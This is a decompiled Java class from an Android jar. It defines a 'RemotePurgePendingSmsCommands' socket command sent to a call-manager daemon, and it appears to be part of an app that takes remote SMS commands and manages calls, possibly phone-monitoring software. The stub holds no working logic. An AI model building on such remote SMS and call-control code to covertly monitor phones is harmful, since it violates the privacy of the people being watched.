package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;

public class RemotePurgePendingSmsCommands
  extends SocketCmd
{
  private static final long serialVersionUID = 2598541042117820367L;
  
  public RemotePurgePendingSmsCommands()
  {
    super(null, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemotePurgePendingSmsCommands";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemotePurgePendingSmsCommands.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */